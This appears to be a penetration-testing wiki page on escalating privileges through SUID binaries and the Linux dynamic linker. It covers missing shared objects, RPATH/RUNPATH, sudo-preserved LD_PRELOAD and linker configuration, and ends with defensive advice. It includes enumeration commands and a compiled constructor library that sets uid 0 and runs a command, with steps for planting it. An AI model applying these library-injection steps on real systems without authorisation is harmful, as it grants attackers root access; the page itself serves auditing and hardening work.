# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries are usually reviewed for direct command execution, but custom SUID programs can also be vulnerable through the dynamic linker. The common theme is simple: a privileged executable loads code from a path or configuration that a lower-privileged user can influence.

This page focuses on generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` through sudo, linker configuration, and SUID hardlink confusion.

## Fast Enumeration

Start by finding unusual SUID files and checking whether they are dynamically linked:

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Focus on non-standard locations, custom application paths, binaries owned by root but outside package-managed directories, and dependencies loaded from writable directories.

Useful writeability checks:

```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Some custom SUID binaries try to load a shared object that does not exist. If the missing path is under a directory controlled by the attacker, the binary may load attacker-supplied code as the effective user.

Find failed library lookups:

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

If the binary searches a writable path for `libexample.so`, a minimal proof library can use a constructor. Keep proof-of-impact harmless during validation:

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Build it with the exact filename the binary tries to load:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

The exploitable condition is not the missing library alone. The attacker must be able to place a compatible shared object at a path the privileged loader will accept.

## Writable Library Directory

Sometimes all dependencies exist, but one of the directories used to resolve them is writable. This may allow replacing a loaded library or planting a higher-priority library with the same name.

Review dependency paths:

```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

If the directory is writable, validate with a copy-safe approach in a lab. Replacing system libraries on a live host can break authentication, package management, or boot-critical services.

## RPATH and RUNPATH

`RPATH` and `RUNPATH` are dynamic-section entries that tell the loader where to search for libraries. They are dangerous in SUID programs when they point to attacker-writable directories.

Detect them:

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Example risky output:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

If `/opt/app/lib` is writable and the binary needs `libcustom.so`, the attacker may be able to place a malicious `libcustom.so` there:

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` and `RUNPATH` are not identical in all resolution details, but for privilege-escalation review the practical question is the same: does the SUID binary search an attacker-writable directory for a library name?

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

For normal programs, `LD_PRELOAD` and `LD_LIBRARY_PATH` can force or influence shared object loading. For SUID programs, the dynamic loader normally enters secure-execution mode and ignores dangerous environment variables.

This means a plain SUID binary is usually not vulnerable just because the user can set `LD_PRELOAD`:

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

The common exception is sudo misconfiguration. If `sudo -l` shows that a variable such as `LD_PRELOAD` or `LD_LIBRARY_PATH` is preserved, a sudo-allowed command may load attacker-controlled code:

```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Do not confuse these cases:

- `LD_PRELOAD` against a normal SUID binary: usually blocked by secure execution.
- `LD_PRELOAD` preserved by sudo: potentially exploitable.
- Missing `.so` in a writable path: exploitable when the SUID binary naturally loads that path.
- `RPATH`/`RUNPATH` to a writable directory: exploitable when a needed library can be controlled.
- `/etc/ld.so.preload` or linker config write access: system-wide and high impact.

## Linker Configuration

The dynamic linker also reads system configuration such as `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, the linker cache, and in some cases `/etc/ld.so.preload`.

High-value checks:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlinks can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

Find SUID files with more than one link:

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Inspect all paths to the same inode:

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

The abuse is not that a hardlink changes permissions. The abuse is path confusion: a privileged inode may be reachable through a name that defenders or scripts do not expect. For deeper inode and hardlink workflow, see [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Keep SUID binaries minimal, audited, and package-managed where possible.
- Avoid `RPATH`/`RUNPATH` entries pointing to writable or application-managed directories.
- Keep library directories root-owned and non-writable by regular users.
- Do not preserve `LD_PRELOAD`, `LD_LIBRARY_PATH`, or similar loader variables through sudo.
- Monitor `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, and unexpected SUID files.
- Review hardlinked SUID files and investigate custom SUID wrappers outside standard system paths.
{{#include ../../banners/hacktricks-training.md}}
